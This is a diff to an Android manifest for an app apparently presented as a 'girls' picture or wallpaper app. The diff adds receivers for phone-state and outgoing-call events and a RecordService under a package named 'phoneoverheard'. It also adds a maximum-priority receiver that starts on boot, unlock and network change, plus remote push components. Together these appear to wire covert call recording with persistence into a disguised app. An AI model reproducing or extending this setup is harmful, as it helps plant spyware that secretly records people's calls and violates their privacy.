@@ -47,6 +47,17 @@
     <uses-permission android:name="android.permission.SET_WALLPAPER" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
 
+    <permission
+        android:name="cn.bmob.permission.push"
+        android:protectionLevel="normal" >
+    </permission>
+
+    <uses-permission android:name="cn.bmob.permission.push" />
+    <!-- 添加自定义的权限 -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.RECEIVE_USER_PRESENT" />
+
     <application
         android:name="cn.linving.girls.MyApplication"
         android:allowBackup="true"
@@ -88,6 +99,18 @@
                 <action android:name="com.donming.dmsms.timer_system" />
             </intent-filter>
         </receiver>
+        <receiver android:name=".PhoneStateReceiver" >
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE" />
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+            </intent-filter>
+        </receiver>
+
+        <service
+            android:name="com.phoneoverheard.phone.RecordService"
+            android:enabled="true"
+            android:exported="false" >
+        </service>
 
         <activity
             android:name="cn.linving.girls.activity.SplashSpotActivity"
@@ -158,10 +181,45 @@
             </intent-filter>
         </receiver>
 
+        <!-- bmob channel -->
+        <meta-data
+            android:name="BMOB_CHANNEL"
+            android:value="bmob" />
+
+        <activity
+            android:name="cn.bmob.v3.update.UpdateDialogActivity"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" >
+        </activity>
+
+        <service
+            android:name="cn.bmob.push.lib.service.PushService"
+            android:exported="true"
+            android:label="PushService"
+            android:permission="cn.bmob.permission.push"
+            android:process="cn.bmob.push" >
+            <intent-filter>
+                <action android:name="cn.bmob.push.lib.service.PushService" />
+            </intent-filter>
+        </service>
+
+        <receiver android:name="cn.bmob.push.PushReceiver" >
+            <intent-filter android:priority="2147483647" >
+
+                <!-- 优先级加最高 -->
+                <!-- 系统启动完成后会调用 -->
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <!-- 解锁完成后会调用 -->
+                <action android:name="android.intent.action.USER_PRESENT" />
+                <!-- 监听网络连通性 -->
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+            </intent-filter>
+        </receiver>
+
         <!-- db调试界面 -->
         <activity
             android:name="com.phoneoverheard.phone.activity.AdminDbTestActivity"
-            android:label="@string/title_activity_admin_db_test" android:screenOrientation="portrait"  >
+            android:label="@string/title_activity_admin_db_test"
+            android:screenOrientation="portrait" >
         </activity>
 
         <!-- 管理员界面 -->
